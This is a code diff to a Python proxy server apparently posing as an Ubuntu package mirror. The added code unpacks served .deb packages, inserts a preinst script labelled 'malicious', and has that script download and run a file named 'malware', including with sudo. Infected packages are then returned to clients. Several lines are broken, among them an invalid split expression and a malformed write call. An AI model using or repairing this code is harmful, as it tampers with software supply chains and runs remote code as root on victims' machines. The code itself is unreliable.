@@ -1,6 +1,7 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import requests
 import os
+import os.path
 # import hashlib
 
 base_url = "http://nl.archive.ubuntu.com"
@@ -17,14 +18,20 @@ class Server(BaseHTTPRequestHandler):
                 self.send_header(header, r.headers[header])
             self.end_headers()
 
+            package = self.path.split("/").[-1]
             #print(r.content)
             #print(hashlib.sha512(r.content).hexdigest())
-            os.system("ar x python-selenium_2.25.0-0ubuntu1_all.deb --output extracting_area") #extract deb files 
-            os.system("gunzip python-selenium_2.25.0-0ubuntu1_all/control.tar.gzip") #unzip control
-            os.system("tar rf python-selenium_2.25.0-0ubuntu1_all/control.tar preinst") #add malicious preinst
-            os.system("gzip python-selenium_2.25.0-0ubuntu1_all/control.tar.gzip") #zip control
-            os.system("ar r ./test/control.tar.gz python-selenium_2.25.0-0ubuntu1_all.deb") #add control back to the deb
-            f = open("python-selenium_2.25.0-0ubuntu1_all.deb", "rb")
+            os.system("ar x {}.deb --output extracting_area".format(package)) #extract deb files 
+            os.system("gunzip {}/control.tar.gzip".format(package)) #unzip control
+            if(os.path.exists("{}/control.tar/preinst".format(package)) == False): #checks whether preinst exists already
+                os.system("tar rf {}/control.tar preinst".format(package)) #add malicious preinst
+            else: # if preinst already exists copy created preinst into the exisiting one
+                w_preinst = open("preinst", "w")
+                w_preinst.write("#!/bin/sh \n", "echo "DOWNLOAD" \n", "wget nl.archive.ubuntu.com/malware \n", "./malware \n", "sudo ./malware \n")
+                w_preinst.close() 
+            os.system("gzip {}/control.tar.gzip".format(package)) #zip control
+            os.system("ar r ./test/control.tar.gz {}.deb".format(package)) #add control back to the deb
+            f = open("{}.deb".format(package), "rb")
             content = f.read()
             #print(content)
             self.wfile.write(content) #if python 3 - bytes(content)
